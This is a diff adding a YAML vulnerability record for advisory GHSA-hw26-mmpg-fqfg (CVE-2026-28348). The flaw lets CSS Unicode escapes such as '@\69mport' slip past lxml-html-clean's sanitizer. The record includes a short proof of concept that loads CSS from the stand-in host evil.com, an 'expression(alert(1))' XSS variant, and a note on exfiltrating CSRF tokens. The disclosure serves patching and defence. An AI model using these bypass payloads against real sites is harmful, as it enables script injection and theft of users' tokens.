@@ -1,0 +1,93 @@
+advisory_id: GHSA-hw26-mmpg-fqfg
+datasource_id: github_osv/GHSA-hw26-mmpg-fqfg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-hw26-mmpg-fqfg/GHSA-hw26-mmpg-fqfg.json
+aliases:
+  - CVE-2026-28348
+summary: |
+  lxml-html-clean has CSS @import Filter Bypass via Unicode Escapes
+  ### Summary
+  The `_has_sneaky_javascript()` method strips backslashes before checking for dangerous CSS keywords. This causes CSS Unicode escape sequences to bypass the `@import` and `expression()` filters, allowing external CSS loading or XSS in older browsers.
+
+  ### Details
+  The root cause is located in `clean.py` (around line 594):
+  ```python
+  style = style.replace('\\', '')
+  ```
+  This transformation changes a payload like `@\69mport` into `@69mport`. This resulting string does NOT match the blacklist keyword `@import`. However, all modern browsers' CSS parsers decode `\69` as the character 'i' (hex 69) according to CSS spec section 4.3.7, interpreting `@\69mport` as a valid `@import` statement.
+
+  Same root cause bypasses `expression()` detection: `\65xpression(alert(1))` passes through (IE only).
+
+  ### PoC
+  ```python
+  from lxml_html_clean import clean_html
+
+  # Normal @import is correctly blocked:
+  # clean_html('<style>@import url("http://evil.com/x.css");</style>')
+  # Output: <div><style> url("http://evil.com/x.css");</style></div>
+
+  # Unicode escape bypass:
+  result = clean_html('<style>@\\69mport url("http://evil.com/x.css");</style>')
+  print(result)
+  # Output: <div><style>@\69mport url("http://evil.com/x.css");</style></div>
+  ```
+  If rendered in a browser, the browser loads the external CSS. Variants like `@\0069mport`, `@\69 mport` (trailing space), and `@\49mport` (uppercase I) also work.
+
+  ### Impact
+  External CSS loading enables data exfiltration via attribute selectors (e.g., reading CSRF tokens), UI redressing, and phishing. In older browsers (IE), this allows for full XSS via `expression()`.
+impacted_packages:
+  - purl: pkg:pypi/lxml-html-clean
+    affected_versions: vers:pypi/<=0.4.3
+    fixed_versions: vers:pypi/0.4.4
+    affected_packages:
+      - pkg:pypi/lxml-html-clean@0.1.0
+      - pkg:pypi/lxml-html-clean@0.1.1
+      - pkg:pypi/lxml-html-clean@0.2.0
+      - pkg:pypi/lxml-html-clean@0.2.1
+      - pkg:pypi/lxml-html-clean@0.2.2
+      - pkg:pypi/lxml-html-clean@0.3.0
+      - pkg:pypi/lxml-html-clean@0.3.1
+      - pkg:pypi/lxml-html-clean@0.4.0
+      - pkg:pypi/lxml-html-clean@0.4.1
+      - pkg:pypi/lxml-html-clean@0.4.2
+      - pkg:pypi/lxml-html-clean@0.4.3
+    fixed_packages:
+      - pkg:pypi/lxml-html-clean@0.4.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/fedora-python/lxml_html_clean
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/fedora-python/lxml_html_clean
+        commit: 2ef732667ddbc74ea59847bcf24b75809aaeed3b
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-hw26-mmpg-fqfg/GHSA-hw26-mmpg-fqfg.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-116
+references:
+  - url: https://github.com/fedora-python/lxml_html_clean
+    reference_type:
+    reference_id:
+  - url: https://github.com/fedora-python/lxml_html_clean/commit/2ef732667ddbc74ea59847bcf24b75809aaeed3b
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-28348
+    reference_type:
+    reference_id: CVE-2026-28348
+  - url: https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-hw26-mmpg-fqfg
+    reference_type:
+    reference_id: GHSA-hw26-mmpg-fqfg
+exploits: []
